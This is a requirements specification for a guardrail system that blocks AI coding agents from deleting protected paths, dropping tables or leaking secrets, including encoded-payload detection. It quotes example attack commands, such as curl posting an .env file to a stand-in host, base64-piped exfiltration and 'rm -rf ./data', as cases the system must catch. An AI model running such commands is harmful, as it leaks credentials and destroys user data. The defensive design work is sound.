# Requirements Document

## Introduction

The `wards` spec turns the minimal judgment rules in `core/src/wards.ts` into the full ward system of Ghost Run+. It covers six areas:

1. Refined judgment rules in `core/`: path normalization, glob matching, a case policy, `file-*` and SQLite change handling, and allow-host matching.
2. P6 content inspection: detection of a secret value (Canary) in captured network payloads, in raw form and in five single-layer encodings.
3. A `wards.yaml` parser, validator, and printer in a new workspace package outside `core/` (the YAML parser must not enter `core/`). The default entry of that package is browser-safe (it imports no Node built-in), so the Ghost Shell playground can parse `wards.yaml` in the browser; file loading lives in a separate Node-only subpath. The file also carries an optional top-level list `safe_commands` that `ghost-gate` (kiro-integration spec) uses to extend its read-only safe list; this spec only parses, validates, and prints it.
4. The block, warn, and pass messages that the hook returns to the agent, built from fixed text with no LLM call.
5. The default `wards.yaml` for the five Ghost Shell scenarios of `docs/plan.md`.
6. The property-based tests that back P4, P5, and P6 within their declared scopes.

The ward system builds on `core-contract` (World Contract, `WardEngine`, `isMoreRestrictive`, P4) and consumes what `ghost-runner` produces (`Change[]`, `ObservedEvent[]`, in-memory payload captures). The ward engine stays a pure, deterministic function: no I/O, no `eval`, no LLM call.

Assumption on core types: the Change kinds of the Ward_Engine follow `core/src/types.ts` only. The file Change kinds are `file-created`, `file-overwritten`, `file-deleted`, and `symlink-changed`; the SQLite Change kind is `sql-row-count` (`table`, `rowsBefore`, `rowsAfter`) with the optional field `dropped`. The `ObservedEvent` type has the optional field `eventId`, and the Ward_Engine receives `secretValues` as a hand-off input. The ghost-runner implementation adds `symlink-changed`, `dropped`, `eventId`, and the `secretValues` hand-off type to `core` first (ghost-runner Requirement 1 criterion 6, Core_Type_Extensions). This spec treats these additions as already present and only references them; it defines no second shape for any of them.

Safety claims follow the world-contract steering ("Claimed in" column) and are not asserted outside their scope:

| Property | Claimed where | Not claimed |
|---|---|---|
| P4 ward monotonicity | All worlds (pure judgment logic) | n/a |
| P5 protection completeness | Where P1 holds (Docker box real mode, Playground) | Plan B (static analysis) |
| P6 secret egress block | Playground; real mode with Docker box where network attempts are recorded | Plan B (static analysis) |

Inconsistencies found between the existing specs and code are not silently resolved. They are listed under "Open Items and Assumptions" at the end of this document, together with the hand-off chosen here.

## Glossary

- **Ward_Engine**: The pure function `WardEngine.evaluate` exported by `core`, which judges a `GhostReport` against a `WardSet` and returns a `WardVerdict`.
- **Ward**: One guard rule with an `id` and a `kind` (`path`, `sql`, `egress`, `physics`), as defined by the `Ward` type in `core`.
- **WardSet**: The ordered list of Wards, parsed from `wards.yaml`.
- **Wards_Config**: The new workspace package `@ghost-run/wards-config` that parses, validates, and prints `wards.yaml`. It depends on `core` and is never imported by `core`. Its default entry (`@ghost-run/wards-config`) is browser-safe; its Node-only entry is the subpath `@ghost-run/wards-config/node`.
- **Default_Entry**: The module graph reachable from `wards-config/src/index.ts` (public path `@ghost-run/wards-config`). It exports `parseWards`, `printWards`, `formatConfigError`, and the types `ConfigError`, `ConfigErrorCode`, `ConfigWarning`, `ParseResult`, and imports no Node built-in module.
- **Node_Entry**: The module `wards-config/src/node.ts` (public path `@ghost-run/wards-config/node`). It exports `loadWardsFile` and is the only entry whose module graph may import `node:fs/promises`.
- **Safe_Command_Entry**: One string of the optional top-level `safe_commands` list of `wards.yaml`: a command prefix pattern of one or more single-space-separated tokens (Requirement 12 criterion 13). `ghost-gate` reads the validated list through `ParseResult.safeCommands` and decides what "prefix match" means; the Ward_Engine ignores it.
- **Config_Error**: One validation finding of Wards_Config with `code`, `message`, `line`, and, when known, `wardId` and `field`.
- **Path_Normalizer**: The `core` function that converts a path or a glob pattern to its canonical form (Requirement 2).
- **Glob_Matcher**: The `core` function that decides whether a normalized path matches a normalized glob pattern (Requirement 3).
- **Host_Matcher**: The `core` function that decides whether a network destination is covered by an `allow_hosts` entry (Requirement 7).
- **Content_Inspector**: The `core` component that searches captured payload bytes for Canary values (Requirements 9 to 11).
- **Message_Builder**: The component that renders a `WardVerdict` into the text returned to the agent (Requirements 16 and 17).
- **Copy_Relative_Path**: A path relative to the root of the Copy, written with `/` separators, as reported by the ghost-runner Differ and Recorder.
- **Protected_Path**: A path that matches a pattern in the `paths` list of a `path` Ward.
- **Secret_Path**: A path that matches a pattern in the `secrets` list of an `egress` Ward.
- **secretValues**: The in-memory hand-off input defined in `core` by ghost-runner (Core_Type_Extensions). It holds the contents of the Copy files that match the `secrets` patterns of the `egress` Wards, read by ghost-runner before the first action executes, one entry per file with the Copy_Relative_Path (`secretPath`) and the content bytes. It is never persisted anywhere.
- **Canary**: A secret value to be searched for in payloads, extracted from one `secretValues` entry by `extractCanaries` (Requirement 9). In tests it is always a fake value such as `sk-CANARY-abc123`.
- **Payload**: The captured bytes of one network attempt (at most 64 KiB, held in memory by ghost-runner in `RunOutput.payloads`, keyed by `eventId`).
- **Event_Id**: The value of the optional `eventId` field of a `core` `ObservedEvent`; it links the event to its Payload. Ghost-runner assigns and formats it (Open Item 3).
- **Core_Type_Extensions**: The additions to `core` made first by the ghost-runner implementation: the `symlink-changed` Change kind, the optional `dropped` field of `sql-row-count`, the optional `eventId` field of `ObservedEvent`, and the `secretValues` hand-off type.
- **Encoding_Kind**: One of `raw`, `base64`, `base64url`, `hex`, `percent`; the only information about a content hit that may appear in output.
- **Behavior_Criterion**: The rule "a `secret-read` event followed, at the same or a later step, by a `network-attempt` event to a host not in `allow_hosts` is a violation".
- **Seance_Link**: The URL `<base>/seance/<id>` that points to the detail page of one run.
- **Block_Message**: The text returned to the agent when the verdict is `block`.
- **Reference_Machine**: An Apple M1 machine, as in the ghost-runner spec.
- **Short_Run**: The property-based test run on file save: at least 100 generated examples per property, finishing within 60 s.
- **Nightly_Run**: The property-based test run with at least 10,000 generated examples per property and no time limit.

## Requirements

### Requirement 1: Package Placement, Dependency Direction, and Purity

**User Story:** As a maintainer, I want the ward judgment in `core/` to stay dependency-free and the YAML handling in a separate package, so that `core/` keeps its zero-runtime-dependency rule and the hook stays fast.

#### Acceptance Criteria

1. THE Path_Normalizer, Glob_Matcher, Host_Matcher, Content_Inspector, Message_Builder, and the refined Ward_Engine SHALL be implemented in `core/` with no runtime dependency; `core/package.json` SHALL list no entry under `dependencies`.
2. THE Wards_Config package SHALL be a pnpm workspace package outside `core/` with the package name `@ghost-run/wards-config`, SHALL be listed in `pnpm-workspace.yaml`, and SHALL declare `@ghost-run/core` as its only workspace dependency; the directory is a design-time decision (Open Item 13).
3. THE `core/` package SHALL contain no import path that resolves to Wards_Config; the ESLint `no-restricted-imports` rule of `core` SHALL enforce this and `pnpm lint` SHALL fail when the rule is violated.
4. THE Wards_Config package SHALL import `core` types and functions only through the public entry point of `@ghost-run/core`.
5. THE Ward_Engine, Path_Normalizer, Glob_Matcher, Host_Matcher, Content_Inspector, and Message_Builder SHALL perform no file I/O, no network call, no process execution, no `eval` or dynamic code execution, and no LLM call, and SHALL read no clock, random source, or environment variable.
6. THE Wards_Config package SHALL perform file I/O only in a function that receives a path argument (`loadWardsFile`, in the Node_Entry); the parse, validate, and print functions SHALL take and return strings and values.
7. BEFORE the Wards_Config package is merged, THE repository README dependency table SHALL list the chosen YAML library and every other new dependency with its name, version, and license, and the recorded license of each SHALL be a permissive license (MIT, BSD-2-Clause, BSD-3-Clause, ISC, or Apache-2.0).
8. THE Wards_Config package SHALL target Node.js 20 or later and SHALL contain no call to any LLM API.
9. THE `.kiro/steering/structure.md` file SHALL be updated, in the same change that adds Wards_Config, to list the package and its dependency direction (Wards_Config may depend on `core`, never the reverse).
10. THE Default_Entry of Wards_Config SHALL import no Node built-in module, neither as `node:<name>` nor as a bare built-in name (`fs`, `path`, `url`, `util`, `os`, `crypto`, `process`, `buffer`, `stream`, `child_process`, and the rest of the Node core module list), directly or through any module it imports inside the package; the same SHALL hold for the entry of the `yaml` library that a bundler selects for a browser target (the `default` export condition of `yaml` 2.9.1 is its browser build). The reason is that the Ghost Shell playground parses `wards.yaml` in the browser. The package SHALL enforce this with two checks: an ESLint `no-restricted-imports` rule that bans `node:*` and the bare Node built-in names in every source file of the Default_Entry (all files of `src/` except `load.ts` and `node.ts`), and a test that walks the import graph of `src/index.ts` and fails when any module in it imports a Node built-in.
11. THE package.json `exports` map of Wards_Config SHALL define exactly two subpaths, `"."` (the Default_Entry) and `"./node"` (the Node_Entry), each with a `types` and an `import` condition that point to the built output, and no other entry; `loadWardsFile` SHALL NOT be exported from the Default_Entry.

### Requirement 2: Path Normalization

**User Story:** As a security reviewer, I want every path and pattern reduced to one canonical spelling before matching, so that spelling tricks such as `./data/../data/x` cannot step around a ward.

#### Acceptance Criteria

1. WHEN the Path_Normalizer receives a Copy_Relative_Path, THE Path_Normalizer SHALL collapse runs of `/` into one `/`, remove every `.` segment (including a leading `./`), remove one trailing `/`, and resolve every `..` segment lexically against the preceding segment, so that `./data/../data/x`, `data//x`, `data/./x`, and `data/x/` each normalize to `data/x`.
2. WHEN a path begins with one or more `/` characters, THE Path_Normalizer SHALL strip the leading `/` characters and treat the remainder as a Copy_Relative_Path, so that an absolute-looking spelling over-matches instead of escaping the ward; the Ward_Engine SHALL NOT know the host location of the Copy.
3. IF lexical resolution of a changed path leaves a leading `..` segment (the path leaves the Copy root), THEN THE Ward_Engine SHALL match that path against no `path` Ward and SHALL add one warn-level `WardNotice` whose reason states that a change path escapes the Copy root, using the sanitized path (Requirement 17 criterion 7).
4. WHEN a changed path contains the character `\`, THE Ward_Engine SHALL evaluate the path in both spellings, as written and with each `\` replaced by `/`, and SHALL treat the path as matching when either spelling matches.
5. THE Path_Normalizer SHALL apply Unicode normalization form NFC (`String.prototype.normalize('NFC')`) to every path and pattern before comparison, in both case modes of Requirement 4.
6. THE Path_Normalizer SHALL be idempotent: FOR ALL strings `p`, `normalize(normalize(p))` SHALL equal `normalize(p)`.
7. THE Path_Normalizer SHALL NOT access the file system and SHALL NOT resolve symbolic links; the precondition for symbolic links and moves is stated in Requirement 5 criterion 5.
8. THE Path_Normalizer SHALL return the empty string for a path that normalizes to the Copy root (for example `.` or `a/..`), and the empty string SHALL match only a pattern that normalizes to the empty string or to `**`.

### Requirement 3: Glob Syntax and Semantics

**User Story:** As a ward author, I want a small, fully specified glob syntax, so that the patterns of `docs/plan.md` (`data/**`, `db/*.sqlite`, `.env`, `**/*.pem`) behave the same everywhere.

#### Acceptance Criteria

1. THE Glob_Matcher SHALL support exactly these constructs: a literal character; `*` (zero or more characters except `/`); `?` (exactly one character except `/`); `[...]` (one character from a class); and `**` as a whole path segment (zero or more segments).
2. THE Glob_Matcher SHALL define a class `[...]` as a non-empty list of single characters and ascending ranges such as `a-z`, optionally negated by a leading `!`, so that `[!0-9]` matches any single character except a digit and except `/`.
3. THE Glob_Matcher SHALL match every pattern anchored at the Copy root, so that `.env` matches the path `.env` and does not match `sub/.env`, and `**/.env` matches `.env` and `sub/.env`.
4. WHEN a pattern ends with the segment `**`, THE Glob_Matcher SHALL let the pattern match the directory named by the preceding segments and every path below it, so that `data/**` matches `data`, `data/x`, and `data/a/b`.
5. THE Glob_Matcher SHALL match `*`, `?`, `**`, and classes against names that begin with `.`, with no special treatment of dotfiles, so that `*.pem` matches `.hidden.pem`.
6. WHEN a normalized path equals a normalized pattern or lies below the directory the pattern names, THE Glob_Matcher SHALL report a match, so that the pattern `data` protects `data`, `data/x`, and `data/a/b` (compatibility with the existing exact-or-descendant rule of `core/src/wards.ts`), and `db/*.sqlite` matches `db/app.sqlite` and `db/app.sqlite/x`.
7. THE Glob_Matcher SHALL NOT treat a leading `!`, a `\` escape, or brace expansion `{a,b}` as syntax; each of these SHALL be reported by `validateGlob` as `unsupported-glob-syntax`.
8. THE `core` package SHALL export `validateGlob(pattern: string)` returning `null` for a valid pattern and otherwise an object with a `code` and a `message`; the codes are `empty-pattern`, `absolute-pattern`, `parent-segment` (a `..` segment), `unsupported-glob-syntax`, `unterminated-class`, `empty-class`, `descending-range`, `partial-doublestar` (`**` combined with other characters in one segment, as in `a**b`), `invalid-character` (a control character or hidden Unicode character from Requirement 12 criterion 9), and `pattern-too-long` (more than 512 characters).
9. THE Glob_Matcher SHALL NOT build a regular expression from a pattern, and the time to match a path of at most 4,096 characters against a pattern of at most 512 characters SHALL be bounded by O(pattern length × path length), so that the pattern `a*a*a*a*a*a*a*a*b` matched against 4,000 `a` characters finishes within 50 ms on the Reference_Machine.
10. FOR ALL generated valid patterns `g` and generated paths `p`, THE Glob_Matcher SHALL give the same result as a reference matcher written with a different technique (a naive recursive matcher) in the test suite (model-based property).

### Requirement 4: Case Policy

**User Story:** As a developer on macOS, I want a protected path to stay protected when the agent spells it with different letter case, so that `rm -rf ./DATA` cannot step around the ward `data/**` on a case-insensitive volume.

#### Acceptance Criteria

1. THE Ward_Engine SHALL compare paths and patterns of `path` Wards case-insensitively by default, folding both sides with the locale-independent `String.prototype.toLowerCase`.
2. THE decision for case-insensitive default SHALL be documented in the README with its rationale: macOS APFS volumes (the primary target OS) are case-insensitive by default, and over-matching fails safe because the extra matches add violations and never remove them; the cost is a possible false positive when two distinct names differ only in case on Linux.
3. WHERE a `path` Ward declares the optional field `case_sensitive: true`, THE Ward_Engine SHALL compare that Ward's paths and patterns case-sensitively.
4. THE `core` `Ward` type SHALL add the optional field `case_sensitive?: boolean` to the `path` Ward only; a Ward without the field SHALL behave as `case_sensitive: false`.
5. THE Ward_Engine SHALL compare the `secrets` patterns of `egress` Wards case-insensitively, and SHALL compare the `tables` names of `sql` Wards case-insensitively (SQLite identifiers are case-insensitive for ASCII), with no option to change either.
6. FOR ALL `path` Wards `w` that differ only in `case_sensitive` (`true` versus absent or `false`) and all plans, THE Ward_Engine SHALL return for the case-insensitive variant a verdict greater than or equal to the verdict for the case-sensitive variant (P4 direction, see Requirement 15 criterion 4).

### Requirement 5: Path Ward Judgment

**User Story:** As a user, I want any plan that deletes or overwrites a protected path to be blocked, so that `rm -rf ./data` and a script-hidden `rm -rf data` are caught by what changed and not by command text.

#### Acceptance Criteria

1. WHEN a Change of kind `file-deleted` has a path that matches a Protected_Path of a `path` Ward whose `deny` list contains `delete`, THE Ward_Engine SHALL add one violation for that Ward whose reason is `would delete protected path <path>`, where `<path>` is the path as written in the Change (sanitized by Requirement 17 criterion 7), not its normalized form.
2. WHEN a Change of kind `file-overwritten` or `symlink-changed` has a path that matches a Protected_Path of a `path` Ward whose `deny` list contains `overwrite`, THE Ward_Engine SHALL add one violation for that Ward whose reason is `would overwrite protected path <path>`; a `symlink-changed` Change counts as `overwrite` for `path` Wards (Open Item 1).
3. THE Ward_Engine SHALL treat the Change kind `file-created` as no violation of any `path` Ward, and SHALL ignore a Change whose `path` field is missing or not a string; a mode-only change emits no Change (ghost-runner reports it as a Diagnostic), so the Ward_Engine has no rule for it.
4. THE Ward_Engine SHALL report at most one violation per (Ward, normalized path, operation) triple, and SHALL list the violations of one Ward in ascending byte order of the normalized path; the normalized path is the de-duplication and sort key only, and the first Change in step order that produces a key supplies the path as written for the reason.
5. THE Ward_Engine SHALL NOT resolve symbolic links and SHALL NOT track moves itself, and the README and this spec SHALL state the precondition under which P5 holds for them: the world implementation reports actual resolved paths in its Changes. A move SHALL appear as `file-deleted` at the source path plus `file-created` at the destination path, and a delete performed through a symbolic link SHALL be reported against the real path; the ghost-runner Differ meets this precondition because it walks the Copy with `lstat` and does not follow links.
6. WHEN a plan moves a Protected_Path to an unprotected destination and then deletes the destination (move-then-delete), THE Ward_Engine SHALL return `block`, because the source path appears as `file-deleted` in the Changes of the move step.
7. THE Ward_Engine SHALL claim P5 only where P1 holds: the verdict of a run whose isolation mode is `static-analysis` SHALL NOT be presented as a P5 guarantee (Requirement 17 criterion 5).
8. THE existing behavior `exact path or descendant` for patterns without glob characters SHALL remain unchanged apart from normalization, and every test in `core/tests/wards.test.ts` that passes before this spec SHALL still pass.

### Requirement 6: SQL Ward Judgment

**User Story:** As a user, I want a ward that limits rows lost in named tables, so that `DROP TABLE users` is reported as "1,206 rows".

#### Acceptance Criteria

1. THE Ward_Engine SHALL judge row-count loss only from Changes of kind `sql-row-count` with the fields `table`, `rowsBefore`, and `rowsAfter` and the optional boolean `dropped` (true when the table no longer exists), and SHALL ignore a `sql-row-count` Change whose `table`, `rowsBefore`, or `rowsAfter` is missing or has the wrong type (Open Item 2).
2. THE Ward_Engine SHALL compute the rows lost by one Change as `max(0, rowsBefore − rowsAfter)`, SHALL count a Change with `dropped: true` by the same formula (`rowsAfter` is `0` for a dropped table), and SHALL sum the rows lost over all Changes of all steps whose table name matches a name in `tables` case-insensitively.
3. WHEN the sum of rows lost exceeds `max_rows_lost`, THE Ward_Engine SHALL add exactly one violation for that Ward whose reason is `would delete <n> rows from <table>` for one table, or the same phrases joined by `, ` in ascending byte order of the lowercase table name for several tables (each table printed in the spelling of the Ward's `tables` entry, not the lower-case sort key), where `<n>` is formatted with `,` as the thousands separator, followed by ` (max allowed <m>)` only when `max_rows_lost` is greater than `0`.
4. WHEN the fixture database with a `users` table of 1,206 rows is processed by a Change of 1,206 rows lost, and a `sql` Ward has `tables: [users, orders]` and `max_rows_lost: 0`, THE Ward_Engine SHALL return `block` with the violation reason `would delete 1,206 rows from users`.
5. THE Ward_Engine SHALL apply a `sql` Ward to the row-count Changes of every database file; the Ward has no per-file scope (Open Item 2).
6. WHEN the sum of rows lost is less than or equal to `max_rows_lost`, THE Ward_Engine SHALL add no violation for that `sql` Ward.

### Requirement 7: Allow-Host Matching

**User Story:** As a ward author, I want exact, predictable host matching for `allow_hosts`, so that an allowed registry does not become an open door to look-alike hosts or raw IP addresses.

#### Acceptance Criteria

1. THE Host_Matcher SHALL accept a destination in one of these forms: `host`, `host:port`, `ipv4`, `ipv4:port`, `[ipv6]`, `[ipv6]:port`, or any of these preceded by `<scheme>://` and followed by a path, query, or fragment; the matcher SHALL strip the scheme, the userinfo before the last `@`, and the path, query, and fragment before comparison.
2. THE Host_Matcher SHALL normalize a host by converting it to lowercase, removing exactly one trailing `.`, and converting an internationalized name to its ASCII (punycode) form using the platform `URL` host parser (no added dependency), so that `Registry.NPMJS.org.` equals `registry.npmjs.org`.
3. IF a destination host cannot be converted to ASCII form or is not a valid host, THEN THE Host_Matcher SHALL report the destination as not allowed.
4. THE Host_Matcher SHALL match an `allow_hosts` entry without a port against the destination host on any port, and SHALL match an entry with a port (`example.test:443`) only against a destination that carries the same port; a destination without a port SHALL match only entries without a port.
5. THE Host_Matcher SHALL match a name entry only against an identical normalized host, so that `example.test` does not allow `a.example.test` and does not allow `example.test.invalid`.
6. WHERE an entry has the form `*.<name>` (for example `*.example.test`), THE Host_Matcher SHALL match a destination whose host has exactly one additional leftmost label (`a.example.test`) and SHALL NOT match the apex `example.test` or a host with two or more additional labels (`a.b.example.test`).
7. THE Host_Matcher SHALL match an IPv4 or IPv6 literal destination only against an entry with the same address, with IPv6 compared in canonical lowercase compressed form, so that a direct-IP attempt such as `192.0.2.10:443` is allowed only when the entry list contains `192.0.2.10` or `192.0.2.10:443`; the matcher SHALL NOT support CIDR ranges.
8. THE Host_Matcher SHALL treat a destination written as a decimal, octal, or hexadecimal integer address (for example `3232235786`) as a name and SHALL therefore not match an IPv4 entry with it.
9. THE Host_Matcher SHALL export `validateHostEntry(entry: string)` returning `null` for a valid entry and otherwise an object with a `code` and a `message`; the codes are `empty-host`, `scheme-not-allowed`, `path-not-allowed`, `userinfo-not-allowed`, `invalid-port` (not an integer from 1 to 65535), `invalid-hostname` (a label of 0 or more than 63 characters, a total of more than 253 characters, a character outside `a-z`, `0-9`, `-`, a label that starts or ends with `-`, after conversion to ASCII form), `invalid-wildcard` (a `*` anywhere except as the whole leftmost label followed by at least two more labels), `invalid-ip` (a dotted address with a leading zero in an octet, such as `010.0.0.1`, or an invalid IPv6 literal), and `invalid-character` (Requirement 12 criterion 9).
10. THE Ward_Engine SHALL replace the existing `hostOf` helper with the Host_Matcher, so that destinations with IPv6 literals, trailing dots, and ports are judged as specified here.

### Requirement 8: Egress Behavior Criterion

**User Story:** As a user, I want "read a secret, then reach an unapproved host" to be blocked by action alone, so that exfiltration is caught even when the payload is compressed, encrypted, or sent one DNS character at a time.

#### Acceptance Criteria

1. WHEN an `egress` Ward is evaluated, THE Ward_Engine SHALL select the `secret-read` events whose normalized path matches a Secret_Path, and SHALL let `firstRead` be the smallest `stepIndex` among them.
2. WHEN `firstRead` exists, THE Ward_Engine SHALL add one violation for that Ward for each `network-attempt` event with `stepIndex` greater than or equal to `firstRead` whose destination the Host_Matcher does not allow against the Ward's `allow_hosts`; a `network-attempt` with a smaller `stepIndex` SHALL add no violation.
3. THE Ward_Engine SHALL keep the comparison `stepIndex >= firstRead` (not `>`) because the events of one action (for example `curl -d @.env https://setup-check.example` in one step) share one `stepIndex` and have no finer order.
4. THE Ward_Engine SHALL describe each behavior violation with a reason of the form `network attempt to <destination> at step <n> after secret read at step <firstRead>; host not in allow_hosts`, using the sanitized destination (Requirement 17 criterion 7).
5. WHEN no `secret-read` event matches a Secret_Path, THE Ward_Engine SHALL add no behavior violation for that Ward, and THE `network-attempt` events SHALL still produce warn-level notices independent of any Ward (existing behavior, Open Item 4).
6. THE Ward_Engine SHALL limit the behavior violations of one Ward to the first 20 in ascending (`stepIndex`, destination) order and SHALL add the violation reason `<k> more network attempts not listed` when more exist, so that the verdict size is bounded.
7. FOR ALL plans that contain a `secret-read` event of a Secret_Path at step `i` and a `network-attempt` to a host outside `allow_hosts` at step `j >= i`, THE Ward_Engine SHALL return `block` (P6, action criterion), and this criterion alone SHALL catch compression, encryption, and one-character-at-a-time DNS exfiltration.

### Requirement 9: Content Inspection Inputs and Canary Extraction

**User Story:** As the ward engine, I want the secret values and the captured payload bytes handed in as plain in-memory inputs, so that content inspection stays a pure function.

#### Acceptance Criteria

1. THE Ward_Engine SHALL accept an optional third parameter `context` of the form `{ payloads?: ReadonlyMap<string, Uint8Array>, secretValues?: <secretValues hand-off type of core> }`, where `payloads` maps an Event_Id to the captured bytes of one network attempt and each `secretValues` entry names the Secret_Path (`secretPath`) of the file it was read from; there is no separately configured Canary list.
2. THE Ward_Engine SHALL return the same verdict as before this spec when `context` is absent and no `secret-read` event of an `egress` Ward occurred.
3. WHILE `secretValues` is absent or empty, or holds no entry whose `secretPath` matches a `secrets` pattern of an `egress` Ward, THE Ward_Engine SHALL run no content inspection for that Ward, SHALL add no content violation for it, and SHALL still apply the Behavior_Criterion of Requirement 8 unchanged; WHEN in that state the caller passed `context` with an absent or empty `secretValues` and a `secret-read` event of a Secret_Path occurred or a Payload exists, THE Ward_Engine SHALL add one warn-level notice naming the Ward `id` and stating that content inspection did not run. A call without `context`, and a call whose non-empty `secretValues` entries belong only to other Wards, SHALL add no such notice (compatibility with the existing `core/tests/wards.test.ts` cases).
4. THE `core` package SHALL export `extractCanaries(secretPath: string, content: Uint8Array)` returning the Canary candidates of one secret file: (a) the whole content with trailing `\r` and `\n` bytes removed; and (b) WHERE the base name of `secretPath` is `.env` or starts with `.env.`, the value of each line of the form `KEY=VALUE` or `export KEY=VALUE`, with surrounding whitespace and one pair of matching quotes removed.
5. THE `extractCanaries` function SHALL discard a candidate shorter than 8 bytes, SHALL discard a candidate longer than 16,384 bytes, SHALL remove duplicates by byte equality, and SHALL return at most 256 candidates; WHEN any candidate is discarded for length or count, THE Ward_Engine SHALL add one warn-level notice naming the Secret_Path and the reason (`too short`, `too long`, or `too many`) without any value.
6. THE minimum length of 8 bytes SHALL guard against false positives: a candidate of 8 random bytes appears in a 64 KiB payload by chance with probability below 2^-30 per encoding form, and the test suite SHALL include a no-false-positive property over random payloads (Requirement 19 criterion 6).
7. THE Ward_Engine SHALL use `secretValues` as the only source of Canaries and SHALL call `extractCanaries` on each entry whose `secretPath` matches a `secrets` pattern of the Ward under evaluation; ghost-runner reads those files from the Copy into memory before the first action runs and persists nothing (ghost-runner Requirement 9 criteria 9 to 13), so the Ward_Engine performs no file I/O (Requirement 1 criterion 5).
8. THE Ward_Engine SHALL use the optional field `eventId` of `ObservedEvent` as it exists in `core` (Core_Type_Extensions) and SHALL NOT define its format; WHEN a payload key has no event with that `eventId`, THE Ward_Engine SHALL still inspect the payload as a network payload and SHALL report it by Event_Id.
9. THE Ward_Engine SHALL NOT retain, copy beyond the evaluation, mutate, or serialize `secretValues`, and SHALL NOT place any `secretValues` byte, or any value derived from it (substring, encoding, hash, or length of a value), in any `WardVerdict` field, violation reason, notice, message, or thrown error message, including the error produced for a malformed `secretValues` entry (Requirement 11 criterion 5).
10. IF a `secretValues` entry is malformed (missing `secretPath`, or content that is not a `Uint8Array`), THEN THE Ward_Engine SHALL skip that entry, SHALL add one warn-level notice naming the sanitized `secretPath` when it is a string and no content, and SHALL NOT throw an exception.

### Requirement 10: Content Inspection Encodings

**User Story:** As a security reviewer, I want a canary found whether it is sent as is or re-encoded in a common single layer, so that `base64 .env | curl --data @-` does not step around the egress ward.

#### Acceptance Criteria

1. WHEN the Content_Inspector inspects one Payload against one Canary, THE Content_Inspector SHALL search these four views of the Payload: the raw bytes (V0); V0 with the bytes `\r`, `\n`, space, and tab removed (V1); V0 percent-decoded, with `+` read as a space and an invalid `%` sequence left as written (V2); and V2 with the same four whitespace bytes removed (V3).
2. THE Content_Inspector SHALL detect `raw` when the Canary bytes occur in V0.
3. THE Content_Inspector SHALL detect `percent` when the Canary bytes occur in V2 and do not occur in V0, which covers the forms `%XX` with upper-case or lower-case hex digits, unreserved characters kept literal, and a space written as `%20` or `+`.
4. THE Content_Inspector SHALL detect `base64` and `base64url` when the base64 text of the Canary occurs in V1 or V3, for the standard alphabet and for the URL-safe alphabet respectively, each with padding (`=`) and without padding.
5. FOR ALL Canaries of at least 8 bytes and ALL prefixes and suffixes of 0 to 64 arbitrary bytes, THE Content_Inspector SHALL detect the Canary in `base64(prefix ‖ canary ‖ suffix)` for every offset of the Canary within its 3-byte group (0, 1, and 2), by searching for the encoded characters whose 6-bit groups lie entirely inside the Canary bytes, with the first and last partially covered characters excluded.
6. THE Content_Inspector SHALL detect `hex` when the lower-case hex text of the Canary occurs in V1 or V3 compared case-insensitively, so that upper-case, lower-case, and mixed-case hex are all detected, including hex broken into lines by tools such as `xxd -p` (60 characters per line).
7. THE Content_Inspector SHALL detect base64 text broken into lines (for example 76 characters per line from the `base64` command) because V1 and V3 remove line breaks.
8. THE Content_Inspector SHALL report for one (event, secret path) pair every Encoding_Kind detected, in the fixed order `raw`, `base64`, `base64url`, `hex`, `percent`, and each kind at most once.
9. THE Content_Inspector SHALL treat a Payload of more than 65,536 bytes as truncated to its first 65,536 bytes (the ghost-runner cap), and SHALL NOT claim detection beyond that limit.
10. THE Content_Inspector SHALL complete the inspection of 16 Payloads of 64 KiB each against 256 Canaries of 4 KiB each within 2.0 s on the Reference_Machine; the work SHALL be bounded by O(total payload bytes × number of encoded forms) plus the cost of the search primitive.

### Requirement 11: Content Hits, allow_hosts, Secrecy, and Scope Limits

**User Story:** As a user, I want a clear rule for how a content hit interacts with `allow_hosts`, and a hard guarantee that no secret value appears in any output.

#### Acceptance Criteria

1. WHEN the Content_Inspector detects a Canary of a Secret_Path of an `egress` Ward in a Payload, THE Ward_Engine SHALL add a violation for that Ward regardless of the destination of the event, including a destination that `allow_hosts` allows, because `allow_hosts` states where the agent may talk and not that a secret value may be sent there.
2. THE Ward_Engine SHALL tie each Canary to the `egress` Ward by `secretPath`: a Canary takes part in the inspection for a Ward only when its `secretPath` matches a pattern in that Ward's `secrets`, so that adding a pattern to `secrets` can only add Canaries and hits (monotone, Requirement 15 criterion 6).
3. THE Ward_Engine SHALL require no `secret-read` event for a content hit, because the Canary comes from the secret file content and a hit proves that the value left the Box.
4. THE violation reason of a content hit SHALL have the form `payload of event <eventId> contains a value from secret file <secretPath> (encoding: <kinds>)`, where `<kinds>` is the comma-separated Encoding_Kind list of Requirement 10 criterion 8, and SHALL contain no Canary byte, no encoded form of a Canary, no Payload byte, no offset, no length of the Canary, and no index of the Canary in the input list.
5. THE Ward_Engine, the Content_Inspector, the Message_Builder, and the Wards_Config package SHALL place no Canary value, no `secretValues` byte, no encoded form of a Canary, and no Payload byte in any `WardVerdict` (violation, notice, reason), message, thrown error message, log line, serialized output, or graveyard entry; THE serialized form of a Payload capture SHALL be limited to `{ eventId, byteLength, sha256 }` as in ghost-runner Requirement 8 criterion 11.
6. THE Content_Inspector SHALL NOT claim detection of compression (gzip, zstd), encryption, multi-layer encodings other than the transport percent-encoding of criterion 1 of Requirement 10, splitting a value over several requests, and DNS exfiltration one character at a time; THE README SHALL list these as outside content inspection, caught only by the Behavior_Criterion of Requirement 8.
7. THE content-inspection violation SHALL be an additional source of `block` and SHALL NOT replace the Behavior_Criterion: WHEN both criteria are satisfied for one run, THE Ward_Engine SHALL list the behavior violations first and the content violations second.
8. THE Ward_Engine SHALL claim P6 only for runs in the Playground or in real mode with the Docker box where network attempts can be recorded, and SHALL NOT present a verdict from `static-analysis` mode as a P6 guarantee (Requirement 17 criterion 5).

### Requirement 12: wards.yaml Parsing and Validation

**User Story:** As a ward author, I want `wards.yaml` read into a `WardSet` with precise, line-numbered errors, so that a typo is found in seconds and Kiro can fix the file.

#### Acceptance Criteria

1. THE Default_Entry of Wards_Config SHALL export `parseWards(text: string)` returning either `{ ok: true, wardSet, safeCommands, warnings }` or `{ ok: false, errors }`, where `errors` is a non-empty array of Config_Error sorted by (`line`, `column`, `code`); `safeCommands` is a `string[]` that is always present on an `ok: true` result and is `[]` when the document has no `safe_commands` key; an `ok: false` result has no `wardSet` and no `safeCommands` field.
2. THE `parseWards` function SHALL accept a document whose root is a mapping with the required key `wards` holding a sequence of 0 to 256 mappings and the optional key `safe_commands` (criterion 13), and SHALL report `root-not-mapping`, `unknown-root-field` (any other root key), or `wards-not-sequence` otherwise.
